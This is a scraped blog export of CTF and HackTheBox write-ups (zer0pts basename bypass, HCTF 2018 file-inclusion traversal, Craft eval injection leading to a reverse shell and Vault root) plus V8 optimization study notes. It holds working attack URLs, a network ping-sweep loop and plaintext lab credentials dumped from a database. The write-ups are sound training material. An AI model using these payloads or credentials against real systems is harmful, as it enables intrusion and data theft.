123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpinclude &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.phpif (preg_match(&#39;&#x2F;config\\.php\\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123; exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;if (isset($_GET[&#39;source&#39;])) &#123; highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); exit();&#125;$secret &#x3D; bin2hex(random_bytes(64));if (isset($_POST[&#39;guess&#39;])) &#123; $guess &#x3D; (string) $_POST[&#39;guess&#39;]; if (hash_equals($secret, $guess)) &#123; $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG; &#125; else &#123; $message &#x3D; &#39;Wrong.&#39;; &#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;Can you guess it?&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;Can you guess it?&lt;&#x2F;h1&gt; &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;&#x2F;p&gt; &lt;p&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;p&gt; &lt;hr&gt;&lt;?php if (isset($message)) &#123; ?&gt; &lt;p&gt;&lt;?&#x3D; $message ?&gt;&lt;&#x2F;p&gt;&lt;?php &#125; ?&gt; &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;guess&quot;&gt; &lt;input type&#x3D;&quot;submit&quot;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; secret由bin2hex(random_bytes(64))生成，如果这个值匹配就能得到flag，但看下PHP文档就知道这不太现实。 因此需要用其他的方法得到FLAG，从include &#39;config.php&#39;; // FLAG is defined in config.php可以知道FLAG在config.php中，也就是说，我么需要某种方式读取config.php 注意到highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));，这里很可疑，basename是一个返回指定路径文件名的函数，$_SERVER[&#39;PHP_SELF&#39;]是当前正在执行的脚本的文件名，这里是用于显示自身源码。 但是，为什么开头有一个检查，要求$_SERVER[&#39;PHP_SELF&#39;]不是以config.php结尾的字符串。这是因为，如果访问的是/index.php/config.php(运行的是index.php), 这种情况下$_SERVER[&#39;PHP_SELF&#39;]是/index.php/config.php,但basename返回的是config.php,因此highlight_file会将config.php的内容显示出来。也就是说，如果绕过了这个检查，我们就能够得到FLAG。 看一下basename的文档。 注意这一句： Note: basename() is locale aware, so for it to see the correct basename with multibyte character paths, the matching locale must be set using the setlocale() function. 为了获得包含多字节字符的路径的正确结果，需要预先使用setlocale() 进行适当设置。 那如果没有进行恰当的设置会发生什么，我们可以简单测试一下： 123456789101112131415161718192021222324252627282930313233$ docker run --rm -it php:7.3-apache bash︙root@a06cc21f03e1:&#x2F;tmp# apt install -y libicu-devroot@a06cc21f03e1:&#x2F;tmp# docker-php-ext-install intlroot@a06cc21f03e1:&#x2F;tmp# cat test.php&lt;?phpfunction check($str) &#123; return preg_match(&#39;&#x2F;config\\.php\\&#x2F;*$&#x2F;i&#39;, $str);&#125;for ($i &#x3D; 0; $i &lt; 0x100; $i++) &#123; $s &#x3D; &#39;&#x2F;index.php&#x2F;config.php&#x2F;&#39; . IntlChar::chr($i); if (!check($s)) &#123; $t &#x3D; basename(&#39;&#x2F;index.php&#x2F;config.php&#x2F;&#39; . chr($i)); echo &quot;$&#123;i&#125;: $&#123;t&#125;\\n&quot;; &#125;&#125;root@a06cc21f03e1:&#x2F;tmp# php test.php︙120: x121: y122: z123: &#123;124: |125: &#125;126: ~127: ^?128: config.php129: config.php130: config.php131: config.php132: config.php︙ /index.php/config.php/%80就可以绕过开始的检查，让basename返回config.php,因此访http://URL/index.php/config.php/%80?source的话，就能够得到config.php的内容。 参考资料https://st98.github.io/diary/posts/2020-03-09-zer0pts-ctf-2020.html","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"Warmup - HCTF 2018","slug":"Warmup-HCTF-2018","date":"2020-03-03T06:30:44.000Z","updated":"2020-03-03T06:31:52.547Z","comments":true,"path":"2020/03/03/Warmup-HCTF-2018/","link":"","permalink":"https://darkwing.moe/2020/03/03/Warmup-HCTF-2018/","excerpt":"","text":"URLにアクセスする,以下の表示: HTMLソースを表示: 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--source.php--&gt; &lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;&lt;/body&gt;&lt;/html&gt; コメントより、source.phpがあるようなのでhttp://URL/source.phpへアクセスすると、ソースコードが表示された。 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; if (! isset($page) || !is_string($page)) &#123; echo \"you can't see it\"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; &#125; ?&gt; hint.phpの内容： 1flag not here, and flag in ffffllllaaaagggg fileパラメータをincludeしてくれるがwhitelistによるチェックがある。また、?より前がwhitelistに合致してもOKとしている。更に、URLデコードしてから?より前がwhitelistに合致してもOKとしている。 つまりは、以下の通り。 hint.php → whitelistにあるためOK miao.php → whitelistに無いためNG hint.php?miao→ ?より前がwhitelistにあるためOK hint.php%3Fmiao → %3FをURLデコードすると?、?より前がwhitelistにあるためOK ただ、このwhitelistを単純に突破しても、includeするファイル名と合致しない。 1http:&#x2F;&#x2F;URL&#x2F;?file&#x3D;hint.php?hint.php よってhint.php?部分をディレクトリ名と見立てて、相対パスで指定してみる。hint.phpのincludeができるかどうかで実験する。 成功。 ffffllllaaaaggggを探す。 http://URL/?file=hint.php?/../ffffllllaaaagggg 同ディレクトリには無い。 ルートを辿る。 flag get: 参考资料这个题目类似这个 CVE-2018-12613 PhpMyadmin后台文件包含分析_PHP_是大方子-CSDN博客https://blog.csdn.net/nzjdsds/article/details/81260335 这篇writeup主要用于对照日文部分专业术语 https://graneed.hatenablog.com/entry/2018/11/11/211721","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"V8的优化编译器","slug":"V8的优化编译器","date":"2020-01-16T07:19:01.000Z","updated":"2020-01-16T07:20:13.890Z","comments":true,"path":"2020/01/16/V8的优化编译器/","link":"","permalink":"https://darkwing.moe/2020/01/16/V8%E7%9A%84%E4%BC%98%E5%8C%96%E7%BC%96%E8%AF%91%E5%99%A8/","excerpt":"","text":"Crankshaft和TurboFan两者都是用于优化的编译器 关于调用优化 Hot-code，即多次调用的函数或者循环 对函数单元或者循环单元进行优化 和主线程中的机器代码运行并行执行，runtime-profiler在其他的线程中计数并判断 也取决于函数或者循环代码的size，大概1000次或者10000次被调用的话，会成为优化对象 123456function f() &#123; return 1;// hot-code(有成为hot-code的可能性)&#125;for (var i=0; i&lt;10000; i++) &#123; func(); // hot-code(有成为hot-code的可能性)&#125; 判定为Hot-code TurboFan/Crankshaft会在hot的其他线程，再次变异对应区域的代码 但是也存在即使是hot-code，也不进行优化的情况(后述) 对(主线程运行中的)机器语言的jmp目的地址进行替换，切换到执行优化后的机器代码 12345678910函数切换为优化代码时，更新函数对象持有的指向JIT区域的指针function f() &#123; return 1;// hot-code(都有成为hot-code的可能性)&#125;for (var i=0; i&lt;10000; i++) &#123; func(); // hot-code(都有成为hot-code的可能性)&#125;在循环中，当从中间切换到优化代码时，可以将jmp目的地址切换到循环的顶部但仍然存在名为OSR（On-Stack-Replacement）的切换方法。但这里省略，参考这篇文章：https://wingolog.org/archives/2011/06/20/on-stack-replacement-in-v8） 优化编译器的适用条件(主要的) 函数/循环中，未使用优化不支持的文法 debugger语句，eval语句之类的 存在”use asm”语句的话，使用TurboFan 只有TurboFan可以优化asm.js 如果有Crankshaft不支持的文法，使用TurboFan try-catch语句，with语句之类的 默认使用Crankshaft 这是2016年的情况，现在Crankshaft被移除 CrankshaftCrankshaft的特点 Type-feedback 使用runtime-profiler收集的信息，确定类型进行加速 最终生成的优化代码包含类型检查 不能确定类型时，也能够回退到优化前的代码 Hydrogen(基于High-Level的中间表现(HIR)的优化) AST以SSA格式展现 各种优化，例如将循环内不变的变量移到循环外 Lithium(基于Low-Level的中间表现(LIR)的优化) 用于寄存器分配的快速算法 依赖CPU的优化，代码生成 细节参考：http://nothingcosmos.github.io/V8Crankshaft/src/blog.html TurboFanTurboFan的概览参考资料： https://github.com/v8/v8/wiki/TurboFan https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.p 下图是2018年现在TurboFan的整体情况 TurboFan的特点 Graph Building 根据AST，生成JavaScript节点的graph JSAdd，JSCallFunction，JSLoadProperty，IfTrue，IfFalse之类的 边生成graph边优化 Optimization 对graph各种优化 Code Generation 机器代码生成 TurboFan的优化参考src/compiler/pipeline.cc inline 函数调用的inline化 trimming 删除没有到达的节点 typer 收集类型信息进行优化 typed-lowering 根据类型将表达式和指令进行变换 loop-peeling 循环内处理转到循环外 simplified-lowering 用更具体的值来进行指令的简单转换 branch-elimination 删除不必要的分支 generic-lowering 将JS前缀指令转换为更简单的调用和stub调用 等等等等 出于某种原因，在名为GenerateCode()的函数中执行了对类型和graph的各种优化。此外，尽管从CreateGraph()调用GenerateCode()，但这些函数原本应该是独立的。(在代码中还有三个独立的部分，job-&gt; CreateGraph()，job-&gt; OptimizeGraph()，job-&gt; GenerateCode()）实际上，在V8的这个时间段中，每个phase都没有完全分离，因为优化和代码生成都是在CreateGraph()函数内部实现的。 优化编译器的确认方法可以使用–trace-opt来检查Crankshaft/TurboFan 还可以使用–turbo-stats检查TurboFan的优化列表和统计数据： 可以使用d8 –print_code之类的检查编译结果：","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[]},{"title":"Encrypted Pastebin Writeup(Hacker101 CTF)","slug":"Encrypted-Pastebin-Writeup-Hacker101-CTF","date":"2020-01-15T04:05:01.000Z","updated":"2020-01-15T04:06:46.501Z","comments":true,"path":"2020/01/15/Encrypted-Pastebin-Writeup-Hacker101-CTF/","link":"","permalink":"https://darkwing.moe/2020/01/15/Encrypted-Pastebin-Writeup-Hacker101-CTF/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. ","categories":[{"name":"Hacker101 CTF","slug":"Hacker101-CTF","permalink":"https://darkwing.moe/categories/Hacker101-CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"HackTheBox — Infiltration","slug":"HacktheBox-—-Infiltration","date":"2020-01-09T07:23:29.000Z","updated":"2020-04-23T06:29:38.134Z","comments":true,"path":"2020/01/09/HacktheBox-—-Infiltration/","link":"","permalink":"https://darkwing.moe/2020/01/09/HacktheBox-%E2%80%94-Infiltration/","excerpt":"","text":"基本信息 Can you find something to help you break into the company ‘Evil Corp LLC’. Recon social media sites to see if you can find any useful information. 在社交网络查找敏感信息 分析(预期)这道题作者是greenwolf，通过gitmemory能在他的Github一个项目insue里能够找到相关信息： https://www.gitmemory.com/Greenwolf https://github.com/Greenwolf/social_mapper/issues/112 其中ins上有趣的信息： https://www.instagram.com/eryn_mcmahon12/ https://www.instagram.com/p/BvbnFhTj9YS/ 模拟的场景是一个员工拍照上传，泄漏了敏感信息 flag就在她的badge上 Google(非预期)现在用Google搜索能直接搜到她的ins 参考资料 https://pastebin.com/Qt94BzZp https://www.gitmemory.com/Greenwolf https://github.com/Greenwolf/social_mapper/issues/112","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"HackTheBox — Easy Phish","slug":"HacktheBox-—-Easy-Phish","date":"2020-01-09T06:58:06.000Z","updated":"2020-04-23T06:29:09.811Z","comments":true,"path":"2020/01/09/HacktheBox-—-Easy-Phish/","link":"","permalink":"https://darkwing.moe/2020/01/09/HacktheBox-%E2%80%94-Easy-Phish/","excerpt":"","text":"基本信息 Customers of secure-startup.com have been recieving some very convincing phishing emails, can you figure out why? 邮件钓鱼相关的，那应该想到DNS中关于反垃圾钓鱼邮件的相关设置 SPFSPF是“发件人策略架构 Sender Policy Framework”的缩写，该系统可防止其他服务器代表您的域发送未经授权的电子邮件。在您的域的DNS表中使用TXT条目配置SPF，并在其中通知允许哪些服务器使用您的域发送电子邮件。收到电子邮件后，收件人的服务器将验证发送服务器是否实际上已被授权使用该域。如果服务器没有，则电子邮件被拒绝。 SPF会在Internet标头中检查用于发送邮件的SMTP（邮件服务器）是否在回答服务器域的IP列表中得到授权。它还会告诉您域是否授权该关系以外的其他IP代表您发送电子邮件。管理员按照（RFC 4408）的规则在DNS区域TXT条目上配置此接口。如果此系统处于活动状态，并且请求的IP与授权的IP不同，则电子邮件将被拒绝。 那么检查下SPF记录，能够得到一部分flag，证明思路是对的，其他部分应该在其他配置中： DKIMDKIM，电子邮件验证标准——域名密钥识别邮件标准。DomainKeys Identified Mail的缩写。 一般来说，发送方会在电子邮件的标头插入DKIM-Signature及电子签名资讯。而接收方则透过DNS查询得到公钥后进行验证。 不过针对这个题目，并没有用到DKIM DMARCDMARC是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，在邮件收发双方建立了邮件反馈机制，便于邮件发送方和邮件接收方共同对域名的管理进行完善和监督。 DMARC要求域名所有者在DNS记录中设置SPF记录和DKIM记录，并明确声明对验证失败邮件的处理策略。邮件接收方接收邮件时，首先通过DNS获取DMARC记录，再对邮件来源进行SPF验证和DKIM验证，对验证失败的邮件根据DMARC记录进行处理，并将处理结果反馈给发送方。 DMARC能够有效识别并拦截欺诈邮件和钓鱼邮件，保障用户个人信息安全。 DMARC在发件人策略框架（SPF）和域密钥标识的邮件（DKIM）协议中添加了一个策略层。SPF协议可与DNS配置一起使用。然后，在配置它时，发送方会通知已授权给定的IP地址使用该域发送消息。 DKIM协议与公钥加密一起使用。这意味着，通过使用该协议发送消息，接收者能够识别该密钥确实属于发送者。最后，当DMARC遇到与电子邮件的任何不一致时，它会使用这两种协议来执行一系列安全措施。 那就检查下DMARC，得到另一部分flag： 参考资料 https://medium.com/@maximilianomeyer1/hint-customers-of-secure-startup-com-1d4591537ff7 http://www.ciotimes.com/InfoSecurity/158336.html","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"HackTheBox — Craft","slug":"HacktheBox-—-Craft","date":"2020-01-08T06:17:50.000Z","updated":"2020-04-23T06:28:23.183Z","comments":true,"path":"2020/01/08/HacktheBox-—-Craft/","link":"","permalink":"https://darkwing.moe/2020/01/08/HacktheBox-%E2%80%94-Craft/","excerpt":"","text":"基本信息Lab地址：https://www.hackthebox.eu/home/machines/profile/197 10.10.10.110 端口扫描首先nmap全端口扫描： 1nmap -p- 10.10.10.110 这一步会比较耗时，耐心等待结果： 服务信息接下来针对这几个端口进一步扫描服务信息： 1nmap -p 22,443,6022 -sV -sC 10.10.10.110 得到结果： 123456789101112131415161718192021222324252627PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)| ssh-hostkey:| 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)| 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)|_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)443/tcp open ssl/http nginx 1.15.8|_http-server-header: nginx/1.15.8|_http-title: About| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US| Not valid before: 2019-02-06T02:25:47|_Not valid after: 2020-06-20T02:25:47|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1.1| tls-nextprotoneg:|_ http/1.16022/tcp open ssh (protocol 2.0)| fingerprint-strings:| NULL:|_ SSH-2.0-Go| ssh-hostkey:|_ 2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port6022-TCP:V=7.80%I=7%D=1/7%Time=5E142311%P=x86_64-apple-darwin18.6.0SF:%r(NULL,C,\"SSH-2\\.0-Go\\r\\n\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 其中443端口的ssl证书信息显示域名为craft.htb,可以先把它添加到hosts里： 110.10.10.110 craft.htb 直接访问443端口的web会有个警告信息，直接信任就可以 子域名craft.htb的Web界面信息显示可以通过REST API访问，直接点击API会出错，因为这是一个子域名，api.craft.htb/api/ API右边的Logo是子域名 gogs.craft.htb，直接点击访问同样失败，看起来是用了Virtual Hosting，我们修改hosts，将这几个域名都加进去： 110.10.10.110 craft.htb api.craft.htb gogs.craft.htb 然后我们再次访问这两个子域名，在信任证书后可以正常显示： Craft API Craft Gogs APIAPI打开是swagger-ui，给出了一些API接口格式信息，看起来有用的是check, login, 和brew这几个 123456789GET &#x2F;auth&#x2F;checkChecks validity of an authorization tokenURL: https:&#x2F;&#x2F;api.craft.htb&#x2F;api&#x2F;auth&#x2F;checkGET &#x2F;auth&#x2F;loginCreate an authentication token provided valid username and passwordURL: https:&#x2F;&#x2F;api.craft.htb&#x2F;api&#x2F;auth&#x2F;loginPOST &#x2F;brew&#x2F;Creates a new brew entryURL: https:&#x2F;&#x2F;api.craft.htb&#x2F;api&#x2F;brew&#x2F; 尝试auth login ： 看起来是401基础认证，尝试简单用户名密码失败，响应如下： 响应头中有一个www-authenticate，看起来如果认证成功会得到一个token，另外检查/auth/check和/brew也可以根据相应信息确定，需要提供有效token： Gogs因为Gogs看起来是Git服务器，我们尝试进行目录爆破： 1python3 dirmap.py -i https://gogs.craft.htb/ -lcf 得到如下结果： 12345678[200][text/html; charset=UTF-8][7.04kb] https://gogs.craft.htb/Administrator[200][text/html; charset=UTF-8][7.04kb] https://gogs.craft.htb/administrator[200][text/html; charset=UTF-8][7.04kb] https://gogs.craft.htb/Administrator/[200][text/html; charset=UTF-8][7.04kb] https://gogs.craft.htb/administrator/[200][text/plain; charset=utf-8][27.34kb] https://gogs.craft.htb/config.codekit[200][text/html; charset=utf-8][160.00b] https://gogs.craft.htb/debug[200][text/html; charset=utf-8][160.00b] https://gogs.craft.htb/debug/[200][text/html; charset=UTF-8][6.83kb] https://gogs.craft.htb/user/login/ 尝试访问/administrator： 在explore中可以发现一个craft-api的repo： 并且能够看到4个用户，administrator之外其他三个用户名是美剧《硅谷》中的角色： 代码信息接下来翻一下repo中的代码 dbtest.py是一个测试数据库连接的脚本，并且有一个测试sql query： test.py中是对API的测试，可以看到认证成功后得到token，之后使用X-Craft-API-Token请求头使用其他API： auth.py是认证需要的一些信息和认证处理流程： 命令注入漏洞继续翻其他文件，brew.py里这段代码很有趣，使用了eval，可能的命令注入： 在issue中有一个相关问题： 点进去可以发现eval是这次commit加进去的： 修复一个bug产生一个新漏洞，但利用这个eval的前提是要有有效认证信息 commit log 泄漏信息转去看commit历史 可以看到第四次提交add test script，第五次是Cleanup test，这里泄漏了认证信息： 1dinesh:4aUh0A8PbVJxgd 有效认证然后，我们就可以使用dinesh的用户名和密码登录Gogs: 也可以使用同样的用户名密码使用API认证得到有效token： 也可以添加X-Craft-Api-Token请求头检查token，确认token有效： 利用命令注入我们现在有有效token，就可以尝试利用/api/brew，在前面的脚本中我们也已经知道了相关请求格式，那么就可以进行测试： 正常的输入处理逻辑如上，但前面也注意到了，这里处理直接使用的eval，可能命令注入： 123456# make sure the ABV value is sane. if eval('%s &gt; 1' % request.json['abv']): return \"ABV must be a decimal value less than 1.0\", 400 else: create_brew(request.json) return None, 201 我们可以打开Python简单测试下： 可以看到这样的代码本地是可以进行命令注入的，接下来就进行下实际验证： 反弹shell可以成功执行命令，接下来尝试反弹shell： 可以成功getshell，root权限 因为这是一个哑shell，想把它变成一个交互shell，但常规方式失败： 检查之后发现现在是在一个docker容器里： 那就扫描下docker这个网段： 1for ip in $(seq 1 254); do (ping -c 1 172.20.0.$ip | grep \"bytes from\" | cut -d \":\" -f1 | cut -d \" \" -f4 &amp;); done 配置文件但好像没什么有用信息,那就还从app本身文件入手： 可以看到这里有一个settings.py文件，前面的Gogs中没有这个文件 在settings.py中，我们可以得到CRAFT_API_SECRET和数据库相关信息： dump db另外dbtest.py直接使用相关信息测试查询数据库，我们可以尝试修改其中的sql query获取信息,不过因为是哑shell，所以需要本地修改好之后传过去，另外没有curl，但可以使用wget： 在modules.py中可以得到数据库结构信息： 修改sql获取所有user信息： 123[&#123;&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;&#125;, &#123;&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;&#125;, &#123;&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;&#125;] 有效账号尝试使用这些信息SSH连接22和 6022端口，均失败 尝试登录Gogs，gilfoyle的信息可用 SSH可以看到一个craft-infra的repo： 并且在 .ssh目录可以得到ssh密钥： 然后就可以用这个私钥以gilfoyle的身份登录SSH，可能会要求输入密码，就是gilfoyle用户的密码： user.txt现在可以得到user flag： vault查看下文件，发现有个.vault-token文件： 简单搜了下，这应该是Hashicorp的Vault ，一种用于在现代应用程序体系结构中安全地管理机密信息的流行工具。 https://www.jianshu.com/p/019a9eb51ae6 https://github.com/hashicorp/vault https://www.vaultproject.io/docs/commands/ 并且前面的craft-infra中也有vault的相关文件： 可以看到vault secrets enable ssh 根据文档查看下token相关信息： 显示capabilities是root，并且前面看到enable ssh，那么尝试ssh： password就是他给的session，成功获得root shell root.txt得到root flag： 并且确认6022端口是前面的docker 以上 参考资料 https://medium.com/bugbountywriteup/hackthebox-craft-bf892b02fb90 https://youtu.be/3znkLWakuUA","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"V8的优化机制","slug":"V8的优化机制","date":"2019-12-27T05:45:18.000Z","updated":"2019-12-27T05:46:19.817Z","comments":true,"path":"2019/12/27/V8的优化机制/","link":"","permalink":"https://darkwing.moe/2019/12/27/V8%E7%9A%84%E4%BC%98%E5%8C%96%E6%9C%BA%E5%88%B6/","excerpt":"","text":"优化 Full-Codegen生成的机器代码(半优化代码)的特点 生成速度快，运行速度慢(浪费较多) 因此，出现了根据需要进行优化的机制 优化1: 利用类型信息缓存 利用Hidden Class的信息，Inline Caching 缓存调用的地址和引用的偏移量 优化2: 重新编译为更高效的JIT代码 运行时判定优化对象 主线程中，正常运行机器代码 其他线程中，Runtime-Profiler测定利用情况 Runtime-Profiler：程序运行时，进行测定，统计的机制 基于测定结果，判定是否进行优化 使用Crankshaft优化编译 再次讲源代码编译为机器代码，替换运行中的机器代码 使用TurboFan优化编译 再次讲源代码编译为机器代码，替换运行中的机器代码 优化的线程关系运行时的关系大概是这样： 2018年现在的关系大概这样： 2. Hidden ClassJavascript中，Object有property，例如这个例子中，使用函数来实现class，其中有x和y属性，被称为property： V8通过调用Hidden Class的机制来实现对property的访问 为了高效访问property 对property访问的实现 一般使用hash table比较多，效率很差 直接实现hash table的话，会增加没有使用的浪费掉的区域 hash冲突情况的处理，管理区域复杂化，也是问题 hash table和后面要讲的Inline caching的相性不是很好 因此需要比hash table更高效的搜索property的机制 property的实现 property的值以数组形式进行管理 通过偏移值来访问数组中的property值 offset另外管理 property名称与偏移量的依赖关系交给别的class(Map) 这个Map被称为Hidden Class Map Object生成时(还没有property时)，obj1内部指向C0 创建一个没有任何property，用于管理类型和offset的MAP(一般叫C0) 当添加obj1.x时，obj1内部改为指向C1 C0中添加x的offset信息，生成新的Map C1(Map也有类型信息) C0中添加转移条件(Map transition) Map C0条件：当x加入时转移到C1 当访问obj1.x的值时，跟踪obj1所持有的指针，引用C1,获得”x的偏移量为0”的信息。之后，通过访问obj1的偏移量0处的值，可以高速的获得x的值。在C1内部，有必要寻找”x”，尽管我个人觉得它与哈希表似乎没有多大区别，但是这会让它速度更快。 当添加obj1.y时，obj1内部改为指向C2 C1中添加y的offset信息，生成新的Map C2 C1中添加转移条件 Map C1 条件：当y加入时转换到C2 C0和C1这时候已经不使用了，但后面可能还会用到，随意不会被移除。 Map复用会存在完全相同property的Object，他们也会有x和y，所以复用生成的Map 创建obj2时指向C0，通过与obj1相同的方式按x和y的顺序添加property，它顺着转换条件以完成C0-&gt;C1-&gt;C2 注意：具有相同名称的property的object，如果property的添加循序不同，那么也会具有不同的转换条件。 因此，最终创建的map也会变成不同的map，也就无法享受到获得加速的好处。有关详细信息，请参阅http://richardartoul.github.io/jekyll/update/2015/04/26/hidden-classes.html另外，如果property添加/删除次数增加太多，Hidden Class的管理会减慢。因此，这种情况不使用Hidden Class，而使用字典类型来管理https://v8project.blogspot.jp/2017/08/fast-properties.html property管理方式 默认情况下，property在object内部通过数组管理 In-Object property property增加(超过11个)时，也会使用object外部的数组 Fast property 进一步增加property的话，会使用object外部的字典管理 Slow/dict property 不使用Map，通过外部字典保存所有信息，也别叫做self-contained 实体是一个FixedArray的数组，但用法类似下土这种字典 参考：https://v8project.blogspot.jp/2017/08/fast-properties.html 这里想说的 (javascript的)object中有指向Map的指针 后面会说，object开头8个字节是指向Map的指针 (javascript的)object指向的Map，会根据情况快速改变 也就是说，在exploit中，这不是一个能够稳定利用的指针 类型相同 = Map的地址相同 通过比较Map的地址，可以确定类型的一致性 3. Inline Caching参考： https://blog.ghaiklor.com/optimizations-tricks-in-v8-d284b6c8b183 https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine https://www.slideshare.net/ssuser6f246f/v8-javascript-engine-for http://cs.au.dk/~jmi/VM/IC-V8.pdf 针对各种action，对类型进行缓存优化的机制这里说的action，大概是这些： 引用，代入(LoadIC, StoreIC) 数组访问(KeyedLoadIC, KeyedStoreIC) 二项运算(BinaryOpIC) # 最近的V8中好像去掉了？ 函数调用(CallIC) 比较(CompareIC) 布尔化(ToBooleanIC) # 最近的V8中好像去掉了？ 要考虑到某些action的JIT代码被多次调用 循环和函数之类的，多次传递相同的JIT代码 执行JIT代码时，关注操作对象（≒参数）的类型 JIT代码，有较高的可能性和上次时同样类型的操作 例如下面的Javascript代码，明显是重复相同类型的操作 对应到JIT代码，也同样成立 JavaScript类型,等价于map地址 从 Hidden Class的实现可以知道，同样类型的话，Map地址也是相同的 对类型进行缓存，也就是将map地址嵌入到JIT code中 例如对obj.x进行引用(Load)的IC，大概是这样： x的offset也一起缓存 当Map匹配时，通过x的offset得到property x，然后返回 实际上会有多个Map注册的情况，因此进行函数化 IC持有State UNINITIALIZED(0): 未初始化 PREMONOMORPHIC(.): 当前只被执行过一次，还没进行IC MONOMORPHIC(1): 只注册一个IC的情况(快速) POLYMORPHIC(P): 注册多个IC的情况(一般速度) MEGAMORPHIC(N): 注册很多个IC的情况(慢速) GENERIC(G): IC已停止的状态 括号里是后面说的debug输出（–trace-ic）的省略的标注 基本上是按照从上到下(0-&gt;.-&gt;1-&gt;P-&gt;N-&gt;G)的顺序迁移 CallIC之类的，是直接0-&gt;1 Inline Caching，可以使用–trace-ic确认 –use-ic使IC有效化(默认)，–no-use-ic使IC无效 关于Inline Caching对前面的总结： 与Hidden Class配对，对高速化做出巨大贡献 对于exploit，只需要关注地址和偏移在JIT中的缓存 创建任意地址读写的原语比较难，因此与exploit的相性不好 但是，某些情况下，IC执行的部分检查（例如边界检查）被部分简化 也就存在在非IC下不会引发的漏洞可能会在IC下触发","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[]},{"title":"V8 